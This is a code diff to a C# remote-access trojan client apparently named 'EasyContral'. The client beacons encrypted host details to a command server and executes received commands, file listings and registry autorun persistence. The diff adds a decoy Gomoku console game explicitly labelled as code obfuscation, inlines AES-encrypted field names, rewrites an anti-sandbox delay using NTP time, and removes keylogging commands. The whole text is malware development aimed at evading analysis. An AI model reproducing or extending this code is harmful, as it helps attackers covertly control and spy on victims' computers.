@@ -9,7 +9,6 @@ using Microsoft.Win32;
 using System.Net.Sockets;
 using System.Net;
 using System.Security.Cryptography;
-using System.Windows.Forms;
 
 namespace EasyContral
 {
@@ -24,12 +23,157 @@ namespace EasyContral
         static string OSInfo = SystemInfo.GetSystemVersion();
         static string MemoryInfo = SystemInfo.GetMemoryInMb();
         static string HostName = SystemInfo.GetSystemName();
-        static List<string> DriveInfo = SystemInfo.GetDrive();
+        //static List<string> DriveInfo = SystemInfo.GetDrive();
         static int WaitTime = 5000;
 
+        /// <summary>
+        /// 代码混淆功能
+        /// </summary>
+        public static int left = 0;
+        public static int top = 18;
+        public static string[,] QP = new string[17, 17];
+        public static string[,] QZ = new string[17, 17];
+        public static void qp()
+        {
+            for (int i = 0; i < 17; i++)
+            {
+                for (int j = 0; j < 17; j++)
+                {
+                    QP[i, j] = "┼";
+                }
+            }
+            for (int i = 0; i < 17; i++)
+            {
+                for (int j = 0; j < 17; j++)
+                {
+                    Console.Write(QP[i, j]);
+                }
+                Console.WriteLine();
+            }
+        }
+        public static void move()
+        {
+            qp();
+            Console.WriteLine(" 双人PK,燃起来吧！\n");
+            Console.WriteLine(" 玩家1： W S A D  控制方向   空格键落子");
+            Console.WriteLine(" 玩家2：↑↓← → 控制方向   Enter键落子");
 
+            left = 16; top = 8;
+            bool M = true;
+            while (true)
+            {
+                Program program = new Program();
+                if (M)
+                {
+                    int i = 1;
+                    int j = i + 1;
+                    if (i == j)
+                    {
+                        Console.WriteLine("●");
+                        QZ[left / 2, top] = "●";
+                        M = false;
+
+                        if (Judge() == true)
+                        {
+                            Console.WriteLine($"\n {QZ[left / 2, top]}方，胜利");
+                            break;
+                        }
+                    }
+                }
+                else
+                {
+                    int i = 1;
+                    int j = i + 1;
+                    if (i == j)
+                    {
+                        Console.WriteLine("○");
+                        QZ[left / 2, top] = "○";
+                        M = true;
+
+                        if (Judge() == true)
+                        {
+                            Console.Write($"\n {QZ[left / 2, top]}方，胜利");
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+        public static bool Judge()
+        {
+            int n1 = 1, n2 = 1, n3 = 1, n4 = 1;
+            for (int j = 1; j < 5; j++)
+            {
+                if (left / 2 + j <= 16)
+                {
+                    if (QZ[left / 2, top] == QZ[left / 2 + j, top]) { n1++; }
+                    else { break; }
+                }
+            }
+            for (int j = 1; j < 5; j++)
+            {
+                if (left / 2 - j >= 0)
+                {
+                    if (QZ[left / 2, top] == QZ[left / 2 - j, top]) { n1++; }
+                    else { break; }
+                }
+            }
+            for (int j = 1; j < 5; j++)
+            {
+                if ((top + j <= 16))
+                {
+                    if (QZ[left / 2, top] == QZ[left / 2, top + j]) { n2++; }
+                    else { break; }
+                }
+            }
+            for (int j = 1; j < 6; j++)
+            {
+                if (top - j >= 0)
+                {
+                    if (QZ[left / 2, top] == QZ[left / 2, top - j]) { n2++; }
+                    else { break; }
+                }
+            }
+            for (int j = 1; j < 5; j++)
+            {
+                if ((left / 2 - j >= 0) && (top - j >= 0))
+                {
+                    if (QZ[left / 2, top] == QZ[left / 2 - j, top - j]) { n3++; }
+                    else { break; }
+                }
+            }
+            for (int j = 1; j < 5; j++)
+            {
+                if ((left / 2 + j <= 16) && (top + j <= 16))
+                {
+                    if (QZ[left / 2, top] == QZ[left / 2 + j, top + j]) { n3++; }
+                    else { break; }
+                }
+            }
+            for (int j = 1; j < 5; j++)
+            {
+                if ((left / 2 + j <= 16) && (top - j >= 0))
+                {
+                    if (QZ[left / 2, top] == QZ[left / 2 + j, top - j]) { n4++; }
+                    else { break; }
+                }
+            }
+            for (int j = 1; j < 5; j++)
+            {
+                if ((left / 2 - j >= 0) && (top + j <= 16))
+                {
+                    if (QZ[left / 2, top] == QZ[left / 2 - j, top + j]) { n4++; }
+                    else { break; }
+                }
+            }
+            if (n1 >= 5 || n2 >= 5 || n3 >= 5 || n4 >= 5) { return true; }
+            else { return false; }
+        }
         static void Main(string[] args)
         {
+            //混淆函数
+            ThreadPool.QueueUserWorkItem(Items => { move(); });
+
             if (AntiSandBox())
             {
                 return;
@@ -37,16 +181,6 @@ namespace EasyContral
             string Drive = "";
 
             HttpClient client = new HttpClient();
-            string a = AESDecrypt("0xAu5UiRiZnoXm+bJodmQg==", Key, IV);
-            string b = AESDecrypt("OqYQ3RtTKfVCu++DfKYx4Q==", Key, IV);
-            string c = AESDecrypt("sLPOasNk+M6R5RamrIlOoA==", Key, IV);
-            string d = AESDecrypt("fR42XnBH1YSP/1UeSUe27Q==", Key, IV);
-            string e = AESDecrypt("GtSeAvriDjw9UP/FPWB+SQ==", Key, IV);
-            string f = AESDecrypt("x3Hkt9kHTYUwmI36ryynrQ==", Key, IV);
-            string g = AESDecrypt("aWE9zu/7O82b3atgVd6l2A==", Key, IV);
-            string h = AESDecrypt("MeQNthYfPvz5oru24Vr0hQ==", Key, IV);
-            string i = AESDecrypt("wHmhVCjw4b+gUiVQSaHM3w==", Key, IV);
-            string k = AESDecrypt("YfckT1CDHddRjspyK/+G7A==", Key, IV);
             while (true)
             {
                 try
@@ -55,21 +189,21 @@ namespace EasyContral
                     Dictionary<string, string> State = new Dictionary<string, string>();
                     Dictionary<string, string> Data = new Dictionary<string, string>();
                     //State.Add("Type", "Connecting");
-                    State.Add(a, b);
+                    State.Add(AESDecrypt("0xAu5UiRiZnoXm+bJodmQg==", Key, IV), AESDecrypt("OqYQ3RtTKfVCu++DfKYx4Q==", Key, IV));
                     //State.Add("ClientID", ClientID);
-                    State.Add(c, ClientID);
+                    State.Add(AESDecrypt("sLPOasNk+M6R5RamrIlOoA==", Key, IV), ClientID);
                     //Data.Add("CPUInfo", CPUInfo);
-                    Data.Add(d, CPUInfo);
+                    Data.Add(AESDecrypt("fR42XnBH1YSP/1UeSUe27Q==", Key, IV), CPUInfo);
                     //Data.Add("OSInfo", OSInfo);
-                    Data.Add(e, OSInfo);
+                    Data.Add(AESDecrypt("GtSeAvriDjw9UP/FPWB+SQ==", Key, IV), OSInfo);
                     //Data.Add("MemoryInfo", MemoryInfo);
-                    Data.Add(f, MemoryInfo);
+                    Data.Add(AESDecrypt("x3Hkt9kHTYUwmI36ryynrQ==", Key, IV), MemoryInfo);
                     //Data.Add("HostName", HostName);
-                    Data.Add(g, HostName);
+                    Data.Add(AESDecrypt("aWE9zu/7O82b3atgVd6l2A==", Key, IV), HostName);
                     //DicMessage.Add("State", State);
-                    DicMessage.Add(h, State);
+                    DicMessage.Add(AESDecrypt("MeQNthYfPvz5oru24Vr0hQ==", Key, IV), State);
                     //DicMessage.Add("Data", Data);
-                    DicMessage.Add(i, Data);
+                    DicMessage.Add(AESDecrypt("wHmhVCjw4b+gUiVQSaHM3w==", Key, IV), Data);
                     string JsonMessage = DicToJson(DicMessage);
                     JsonMessage = AESEncrypt(JsonMessage, Key, IV);
                     var content = new StringContent(JsonMessage, Encoding.UTF8, "application/json");
@@ -82,9 +216,9 @@ namespace EasyContral
                     State.Clear();
                     Data.Clear();
                     //string Type = result["State"]["Type"];
-                    string Type = result[h][a];
+                    string Type = result[AESDecrypt("MeQNthYfPvz5oru24Vr0hQ==", Key, IV)][AESDecrypt("0xAu5UiRiZnoXm+bJodmQg==", Key, IV)];
                     //string Command = result["Data"]["ServerMessage"];
-                    string Command = result[i][k];
+                    string Command = result[AESDecrypt("wHmhVCjw4b+gUiVQSaHM3w==", Key, IV)][AESDecrypt("YfckT1CDHddRjspyK/+G7A==", Key, IV)];
                     switch (Type)
                     {
                         case "CMD":
@@ -95,7 +229,7 @@ namespace EasyContral
                         case "Drives":
                             //SendToServer(result, Drive, "DirResult");
                             SendToServer(result, Drive, AESDecrypt("U9ImpoXkig2Ym3GuDa1umw==", Key, IV));
-                            break;  
+                            break;
                         case "Files":
                             string files = FileContral.GetFileList(Command);
                             //SendToServer(result, files, "FilesResult");
@@ -157,16 +291,6 @@ namespace EasyContral
                             //SendToServer(result, "OK", "AutoRunRegistryResult");
                             SendToServer(result, "OK", AESDecrypt("f0K33hL+D0BGnVKW8rtojt0VFBYtmae6+9W9QtWhlUI=", Key, IV));
                             break;
-                        case "KeyBoardListenOn":
-                            GeneralContral.KeyboardListen(true);
-                            //SendToServer(result, "OK", "KeyboardListenOnResult");
-                            SendToServer(result, "OK", AESDecrypt("mxocd/wji2IVPa/h7NgbBI9VKU53rJ/l02QZ2V3Jtgs=", Key, IV));
-                            break;
-                        case "KeyBoardListenOff":
-                            string KeyBoardLog = GeneralContral.KeyboardListen(false);
-                            //SendToServer(result, "OK", "KeyBoardListenOffResult");
-                            SendToServer(result, KeyBoardLog, AESDecrypt("dsgCq9/sF/syDnoTxXNkmFfOdT0qOOF7h89z+kLZWjA=", Key, IV));
-                            break;
                         case "SetSleepTime":
                             WaitTime = int.Parse(Command) * 1000;
                             break;
@@ -181,39 +305,44 @@ namespace EasyContral
         }
         static bool AntiSandBox()
         {
-            int delay = 5;//延迟执行时间
-            TimeSpan span = TimeSpan.FromMilliseconds(Environment.TickCount);//系统运行时间
-            if (IsRegistryKeyExists(@"SOFTWARE\Tencent\QQ") || IsRegistryKeyExists(@"SOFTWARE\Tencent\WeChat") || span.TotalSeconds < delay)
+            if (IsRegistryKeyExists(@"SOFTWARE\Tencent\QQ") || IsRegistryKeyExists(@"SOFTWARE\Tencent\WeChat"))
             {
                 return true;
             }
-            string time = GetNetworkTimeInSeconds();
-            string mouse_x = Control.MousePosition.X.ToString();
-            string mouse_y = Control.MousePosition.Y.ToString();
+            ulong time = GetNetworkTimeInSeconds();
             while (true)
             {
-                string now = GetNetworkTimeInSeconds();
-                Console.WriteLine((long.Parse(now) - long.Parse(time)) / 1000);
-                if (mouse_x == Control.MousePosition.X.ToString() && mouse_y == Control.MousePosition.Y.ToString())
-                {
-                    return true;
-                }
-                if ((long.Parse(now) - long.Parse(time)) / 1000 >= delay)
+                ulong now = GetNetworkTimeInSeconds();
+                Console.WriteLine(now - time);
+                if (now - time >= 300)
                 {
                     return false;
                 }
             }
         }
-        public static string GetNetworkTimeInSeconds()
+        public static ulong GetNetworkTimeInSeconds()
         {
-            WebRequest webrequest = WebRequest.Create("https://api.pinduoduo.com/api/server/_stm");
-            WebResponse webresponse = webrequest.GetResponse();
-            Stream s = webresponse.GetResponseStream();
-            StreamReader sr = new StreamReader(s, Encoding.GetEncoding("UTF-8"));
-            string result = sr.ReadToEnd();
-            result = result.Replace("{\"server_time\":","").Replace("}","");
+            const string ntpServer = "time.windows.com";
+            var ntpData = new byte[48];
+            ntpData[0] = 0x1B;
+
+            var addresses = Dns.GetHostEntry(ntpServer).AddressList;
+            var ipEndPoint = new IPEndPoint(addresses[0], 123);
+            using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
+            {
+                socket.Connect(ipEndPoint);
+                socket.Send(ntpData);
+                socket.Receive(ntpData);
+            }
+            const byte serverReplyTime = 40;
+            ulong intPart = BitConverter.ToUInt32(ntpData, serverReplyTime);
+            ulong fractPart = BitConverter.ToUInt32(ntpData, serverReplyTime + 4);
+            intPart = SwapEndianness(intPart);
+            fractPart = SwapEndianness(fractPart);
+            ulong milliseconds = (intPart * 1000) + ((fractPart * 1000) / 0x100000000L);
+            ulong seconds = milliseconds / 1000;
             Thread.Sleep(5000);
-            return result;
+            return seconds;
         }
         private static uint SwapEndianness(ulong x)
         {
@@ -295,5 +424,7 @@ namespace EasyContral
                 }
             }
         }
+
+
     }
 }
